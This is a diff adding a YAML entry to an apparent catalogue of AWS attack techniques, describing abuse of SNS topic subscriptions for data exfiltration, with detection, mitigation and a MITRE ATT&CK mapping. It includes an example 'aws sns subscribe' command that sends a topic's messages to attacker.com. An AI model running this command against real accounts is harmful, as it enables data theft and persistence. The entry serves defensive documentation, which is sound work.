@@ -1,0 +1,23 @@
+Category: Data Exfiltration
+Command: aws sns subscribe
+Detection:
+- Monitor SNS subscription changes in CloudTrail.
+Example:
+- Command: aws sns subscribe --topic-arn arn:aws:sns:REGION:ACCOUNT_ID:my-topic --protocol
+    https --notification-endpoint https://attacker.com
+  Output: Subscription ARN
+MITRE_ATT&CK: T1537
+Service: AWS SNS
+description: Subscribes an attacker-controlled endpoint to an SNS topic for data exfiltration
+  or persistence.
+impact:
+- data exfiltration
+mitigation: Restrict SNS subscription permissions. Audit topic subscribers regularly.
+name: SNS Topic Subscription
+references:
+- https://docs.aws.amazon.com/sns/latest/api/API_Subscribe.html
+tags:
+- data-exfiltration
+- sns
+- subscription
+- T1537
